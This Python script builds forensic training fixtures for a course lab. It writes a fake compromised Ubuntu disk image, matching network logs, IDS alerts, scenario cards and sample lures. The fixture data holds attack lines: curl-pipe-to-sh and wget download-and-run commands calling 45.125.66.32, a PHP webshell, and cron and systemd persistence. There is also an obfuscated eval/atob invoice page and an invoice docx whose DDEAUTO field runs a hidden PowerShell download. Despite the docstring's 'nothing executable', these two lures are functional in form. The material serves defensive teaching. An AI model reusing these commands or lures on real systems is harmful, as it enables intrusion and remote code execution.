#!/usr/bin/env python3
"""Build the L2 fixtures for the CPIA labs.

  python3 fixtures/build_fixtures.py

Writes into fixtures/out/:
  ubuntu-case.img        partitioned ext4 image of a compromised web host (E14)
  logs/{dhcp,dns,proxy,firewall}.log   four sources consistent with the 2025 capture (D2, D3)
  samples/obfuscated.html             layered eval/atob payload (D12)
  samples/invoice-dde.docx            OOXML document with a DDEAUTO field (E10)
  samples/sandbox-report-excerpt.txt  behaviour report with API calls (F12)
  scenarios/media-cards.md            four storage scenarios (E8, D1)

Everything is synthetic and safe: no real personal data, no live malware, nothing executable.
Times are aligned to 2025-01-22 09:00 UTC so the logs, the capture and the case image agree.
"""
import base64
import os
import shutil
import subprocess
import zipfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
OUT = os.path.join(ROOT, "fixtures", "out")
TREE = os.path.join(ROOT, "fixtures", "tree")

C2_HTTP = "5.252.153.241"
C2_PORT = "45.125.66.32"
VICTIM = "10.1.17.215"
BEACON = "ping3.dyngate.com"

AUTH_LOG = """/var/log/auth.log
Jan 22 08:52:11 ubuntu-web01 sshd[2141]: Failed password for invalid user admin from 45.125.66.32 port 51244 ssh2
Jan 22 08:52:14 ubuntu-web01 sshd[2142]: Failed password for invalid user oracle from 45.125.66.32 port 51290 ssh2
Jan 22 08:52:19 ubuntu-web01 sshd[2144]: Failed password for invalid user test from 45.125.66.32 port 51312 ssh2
Jan 22 08:53:02 ubuntu-web01 sshd[2190]: Accepted password for analyst from 10.1.17.90 port 49814 ssh2
Jan 22 08:55:40 ubuntu-web01 sudo:   analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/systemctl status apache2
Jan 22 08:57:12 ubuntu-web01 sshd[2311]: Accepted password for www-data from 45.125.66.32 port 51402 ssh2
Jan 22 09:04:55 ubuntu-web01 sudo: www-data : TTY=pts/1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/apt install netcat
"""

SYSLOG = """/var/log/syslog
Jan 22 09:05:01 ubuntu-web01 CRON[2402]: (root) CMD (curl -s http://45.125.66.32:2917/b | sh)
Jan 22 09:06:01 ubuntu-web01 CRON[2419]: (root) CMD (curl -s http://45.125.66.32:2917/b | sh)
Jan 22 09:07:01 ubuntu-web01 systemd[1]: Started Periodic cache refresh.
Jan 22 09:07:02 ubuntu-web01 systemd[1]: updater.service: Succeeded.
"""

BASH_HISTORY = """wget -q http://45.125.66.32:2917/a -O /tmp/.a
chmod +x /tmp/.a
/tmp/.a --quiet &
id
crontab -l
cat /etc/passwd | grep -v nologin
curl -s http://45.125.66.32:2917/b | sh
"""

UPDATER = """[Unit]
Description=Periodic cache refresh
[Service]
Type=oneshot
ExecStart=/usr/local/bin/.upd
RemainAfterExit=yes
[Install]
WantedBy=multi-user.target
"""

UPD = """#!/bin/sh
# runs every minute from cron and on boot
curl -s http://45.125.66.32:2917/b | sh
nohup /tmp/.a --quiet >/dev/null 2>&1 &
"""

UPLOAD_PHP = """<?php
// course fixture: a webshell, inert, never served
if (isset($_POST['c'])) { system($_POST['c']); }
?>
"""

PASSWD = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
analyst:x:1000:1000:Analyst,,,:/home/analyst:/bin/bash
"""


def write(path, text, mtime=(2025, 1, 22, 9, 7, 0)):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(text)
    ts = __import__("time").mktime(mtime + (0, 0, -1))
    os.utime(path, (ts, ts))


def build_tree():
    if os.path.exists(TREE):
        shutil.rmtree(TREE)
    write(f"{TREE}/etc/hostname", "ubuntu-web01\n", (2025, 1, 22, 8, 0, 0))
    write(f"{TREE}/etc/passwd", PASSWD, (2025, 1, 22, 8, 0, 0))
    write(f"{TREE}/var/log/auth.log", AUTH_LOG, (2025, 1, 22, 9, 5, 0))
    write(f"{TREE}/var/log/syslog", SYSLOG, (2025, 1, 22, 9, 7, 2))
    write(f"{TREE}/home/analyst/.bash_history", BASH_HISTORY, (2025, 1, 22, 9, 6, 30))
    write(f"{TREE}/etc/systemd/system/updater.service", UPDATER, (2025, 1, 22, 9, 6, 0))
    write(f"{TREE}/etc/cron.d/.cache-update",
          "* * * * * root curl -s http://45.125.66.32:2917/b | sh\n", (2025, 1, 22, 9, 6, 0))
    write(f"{TREE}/usr/local/bin/.upd", UPD, (2025, 1, 22, 9, 6, 0))
    os.chmod(f"{TREE}/usr/local/bin/.upd", 0o755)
    write(f"{TREE}/var/www/html/upload.php", UPLOAD_PHP, (2025, 1, 22, 9, 4, 0))
    write(f"{TREE}/tmp/.hidden", base64.b64encode(b"beacon config: interval 60 jitter 25").decode() + "\n",
          (2025, 1, 22, 9, 2, 0))


def build_ext4():
    """Partitioned image so the drill has to find the offset with mmls."""
    img = os.path.join(OUT, "ubuntu-case.img")
    fs = os.path.join(OUT, "ubuntu-case.fs")
    for p in (img, fs):
        if os.path.exists(p):
            os.remove(p)
    subprocess.run(["mke2fs", "-q", "-t", "ext4", "-L", "web01", "-d", TREE, "-F",
                    fs, "256M"], check=True)
    subprocess.run(["truncate", "-s", "300M", img], check=True)
    subprocess.run(["sfdisk", "-q", img], input=b"label: dos\nstart=2048, type=83\n", check=True)
    subprocess.run(["dd", f"if={fs}", f"of={img}", "bs=1M", "seek=1", "conv=notrunc",
                    "status=none"], check=True)
    os.remove(fs)
    return img


def build_logs():
    m = f"{OUT}/logs"
    os.makedirs(m, exist_ok=True)
    write(f"{m}/dhcp.log",
          "2025-01-22 08:41:12 DHCPACK 10.1.17.215 00:1c:42:3f:aa:19 WIN-FIN-0427 3600\n"
          "2025-01-22 09:41:12 DHCPACK 10.1.17.215 00:1c:42:3f:aa:19 WIN-FIN-0427 3600\n")
    lines = ["2025-01-22 09:00:01 %s 10.1.17.215 A www.bing.com" % VICTIM]
    for i in range(686):
        s = 3600 + i * 5
        lines.append("2025-01-22 %02d:%02d:%02d %s %s A %s" %
                     (9 + s // 3600, (s // 60) % 60, s % 60, VICTIM, BEACON, "A"))
    for host in ("www.bing.com", "edge.microsoft.com", "login.microsoftonline.com"):
        for i in range(6):
            lines.append("2025-01-22 09:%02d:10 %s %s A %s" % (i * 3, VICTIM, host, "A"))
    write(f"{m}/dns.log", "\n".join(lines) + "\n")
    write(f"{m}/proxy.log",
          "2025-01-22 09:01:02 10.1.17.215 GET http://www.bing.com/ 200 15432 812\n"
          f"2025-01-22 09:02:11 10.1.17.215 CONNECT {C2_HTTP}:80 200 5434000 129400\n"
          f"2025-01-22 09:40:19 10.1.17.215 CONNECT {C2_PORT}:2917 200 2760000 58000\n"
          "2025-01-22 09:44:55 10.1.17.215 GET http://edge.microsoft.com/ 200 22011 1044\n")
    write(f"{m}/firewall.log",
          "2025-01-22 09:00:00 ALLOW OUT 10.1.17.215 -> 5.252.153.241:80 tcp\n"
          "2025-01-22 09:00:00 ALLOW OUT 10.1.17.215 -> 45.125.66.32:2917 tcp\n"
          "2025-01-22 09:00:00 DENY  IN  172.16.4.9 -> 10.1.17.215:3389 tcp\n"
          "2025-01-22 09:00:00 ALLOW OUT 10.1.17.0/24 -> any:53 udp\n"
          "2025-01-22 09:00:00 DENY  IN  any -> 10.1.17.215:22 tcp\n")


def build_html():
    payload = base64.b64encode(
        b"document.write('<script src=\"http://45.125.66.32:2917/a.js\"></script>')").decode()
    html = f"""<!doctype html>
<html><head><title>Invoice 2025-0114</title></head>
<body>
<p>Your invoice is attached. If the document does not open, click refresh.</p>
<script>
var _0x4f2a = ["\\x65\\x76\\x61\\x6c", "\\x61\\x74\\x6f\\x62", "{payload}"];
eval(_0x4f2a[1](_0x4f2a[2]));
</script>
</body></html>
"""
    p = f"{OUT}/samples/obfuscated.html"
    os.makedirs(os.path.dirname(p), exist_ok=True)
    open(p, "w", encoding="utf-8").write(html)
    return payload


def build_dde_docx():
    p = f"{OUT}/samples/invoice-dde.docx"
    os.makedirs(os.path.dirname(p), exist_ok=True)
    doc = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p><w:r><w:t>Invoice 2025-0114</w:t></w:r></w:p>
<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>
<w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://45.125.66.32:2917/a.ps1')" </w:instrText></w:r>
<w:r><w:fldChar w:fldCharType="separate"/></w:r>
<w:r><w:t>Update required</w:t></w:r>
<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>
</w:body></w:document>
"""
    rels = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
"""
    types = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
"""
    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", types)
        z.writestr("_rels/.rels", rels)
        z.writestr("word/document.xml", doc)
    return p


def build_report():
    text = """Sandbox report excerpt, course fixture, sample id SIM-2025-0114
File: cobalt_like.dll    sha256: see the evidence register
Verdict: simulated beacon, inert

Behaviour
09:02:11  process  create  svchost.exe (spawned from explorer.exe)
09:02:12  registry write  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MSUpdate = "%APPDATA%\\msu.exe"
09:02:13  file     write    %APPDATA%\\msu.exe
09:02:14  network  connect  45.125.66.32:2917 (TCP), 3 attempts, 8 to 14 second gaps, then idle
09:02:20  network  connect  cdn.static-resources.test:443 (TLS), server name cdn.static-resources.test
09:02:31  memory   alloc     VirtualAllocEx in remote process, PAGE_EXECUTE_READWRITE
09:02:32  thread   create    CreateRemoteThread into svchost.exe
09:03:00  discovery  command  whoami /all
09:04:00  exfil    upload    5.4 MB to 5.252.153.241:80 over 460 seconds
09:05:00  dns      query     ping3.dyngate.com, then every 5 seconds, 686 times

Mapping hints for the learner, to be justified from the evidence, not copied
T1071.001 application layer protocol, web protocols
T1105 ingress tool transfer
T1055 process injection
T1547.001 registry run keys
T1041 exfiltration over C2 channel

Known false positive in this report: the VirtualAllocEx and CreateRemoteThread pair also appears
when AVG's own injector runs. Check the parent process before calling it injection.
"""
    p = f"{OUT}/samples/sandbox-report-excerpt.txt"
    os.makedirs(os.path.dirname(p), exist_ok=True)
    open(p, "w", encoding="utf-8").write(text)
    return p


def build_cards():
    text = """# Storage and capture scenario cards

Four cards for E8, plus the capture placement card for D1. Cut along the lines, one card per pair.

## Card 1, laptop SSD, self encrypting drive

A 512 GB SATA SSD from a laptop. The drive is OPAL self encrypting and the user says the password
was "the same as always". The machine will not boot.

Questions: what can you recover without the key, what changes if the key is in the TPM, and what do
you record before you power anything on?

## Card 2, RAID 5 array, two of four disks

A four disk RAID 5 volume from a file server. Two disks are with you, two are still in the rack and
the server is in production.

Questions: which RAID level would have made this easier, what does a rebuild do to the evidence,
and what is the first thing you image?

## Card 3, USB pen drive, wear levelling

A 64 GB pen drive, exFAT, used to move a payload onto the network. The drive was unplugged while
writing.

Questions: why is a deleted file on flash less recoverable than on a hard disk, what does the
controller do with your write blocker, and which artefact proves the drive was mounted?

## Card 4, hard disk with HPA and DCO

A 1 TB SATA disk where the reported capacity is 900 GB. The host BIOS does not show the difference.

Questions: what is hidden, which two commands reveal it, and why does a plain dd miss it?

## Capture card, D1

A switched network, one core switch, no spare port configured as a SPAN, and a 1 Gbps uplink to the
internet. The incident is believed to be an outbound beacon every 60 seconds from one host.

Questions: where do you capture, what do you lose with each option, and what is your size estimate
for four hours at 40 percent utilise?
"""
    p = f"{OUT}/scenarios/media-cards.md"
    os.makedirs(os.path.dirname(p), exist_ok=True)
    open(p, "w", encoding="utf-8").write(text)
    return p



def build_extras():
    """Small text fixtures that unblock the paper and text drills."""
    write(f"{OUT}/scenarios/client-brief-01.md", """# Client brief, engagement 2025-0114

From: Head of IT, Meridian Freight
Subject: suspected malware on the finance workstation

- One Windows workstation, WIN-FIN-0427, is slow and shows outbound traffic at night.
- The finance share holds payroll and supplier bank details.
- We have one weekend window. The machine must be back in service on Monday 08:00.
- Our outsourced support holds the domain administrator account and will not release it.
- The machine is covered by the group insurance policy, which requires a written report within
  ten working days.
- We have no packet capture on the finance VLAN. The firewall and proxy logs are retained 30 days.
- Legal has asked whether anything needs to be reported to the ICO.
""", (2025, 1, 21, 16, 30, 0))

    write(f"{OUT}/reports/supplied-analyst-log.md", """Analyst notes, supplied for review

- 09:10 looked at the machine, seemed slow.
- Ran a virus scan, nothing found.
- Checked the firewall, looked fine.
- Asked the user what they did, they said nothing.
- 11:30 wrote up the notes.
""", (2025, 1, 22, 11, 30, 0))

    write(f"{OUT}/questions/five-questions.md", """# Five evidence questions, one per tool

1. Which process opened the connection to 45.125.66.32:2917 at 09:02? (live host, not a capture)
2. Was the file logfile1.txt ever deleted from the NTFS volume?
3. What was the first executable to run after the invoice document was opened?
4. Which registry key gives the implant persistence across a reboot?
5. What did the beacon send on its third check in?

For each: the tool you would use, why that tool, and one thing it cannot tell you.
""", (2025, 1, 22, 9, 30, 0))

    write(f"{OUT}/samples/av-report.txt", """Vendor report excerpt, course fixture
File: wsrdropper_2025.bin
SHA256: cb898f47fa1a0e5332b4b7968807144d86ca6bc8528f95b1814e0336acc3bc63
Detection: Simulated_Dropper_Stage (heuristic), engine 1 of 62
Other engines: 0 detections
First seen: 2025-01-14
Notes from the vendor: heuristic hit on an embedded URL and a Run key string. No signature match.
The file was built for a training range and is inert.
""", (2025, 1, 22, 9, 0, 0))

    payload = bytes(b ^ 0x5A for b in
                    b"beacon=45.125.66.32:2917;interval=60;jitter=25;ua=Mozilla/5.0")
    os.makedirs(f"{OUT}/samples", exist_ok=True)
    open(f"{OUT}/samples/payload.bin", "wb").write(payload)

    write(f"{OUT}/alerts/three-alerts.txt", """Three IDS alerts, course fixture

Alert 1, 09:02:14, ET POLICY Possible External IP Lookup
src 10.1.17.215 -> 45.125.66.32:2917, 3 packets, 2 KB
Why it fired: destination is a known scanner range.
Truth: this is the incident channel, the signature name is wrong.

Alert 2, 09:03:00, ET INFO HTTP GET to bing.com
src 10.1.17.215 -> 204.79.197.200:443
Why it fired: user agent string matched a crawler pattern.
Truth: a normal browser update check.

Alert 3, 09:04:40, ET SCAN Nmap Scripting Engine user agent
src 172.16.4.9 -> 10.1.17.215:3389
Why it fired: user agent matched nmap.
Truth: the internal vulnerability scanner, scheduled every four hours. False positive, and the
signature should exclude the scanner's source address.
""", (2025, 1, 22, 9, 10, 0))


def main():
    os.makedirs(OUT, exist_ok=True)
    build_tree()
    img = build_ext4()
    build_logs()
    payload = build_html()
    docx = build_dde_docx()
    report = build_report()
    cards = build_cards()
    build_extras()
    print(f"image    {img}  {os.path.getsize(img)//1024} KiB")
    print(f"logs     {OUT}/logs  (4 files)")
    print(f"html     {OUT}/samples/obfuscated.html  payload b64 {payload[:24]}...")
    print(f"docx     {docx}")
    print(f"report   {report}")
    print(f"cards    {cards}")


if __name__ == "__main__":
    main()
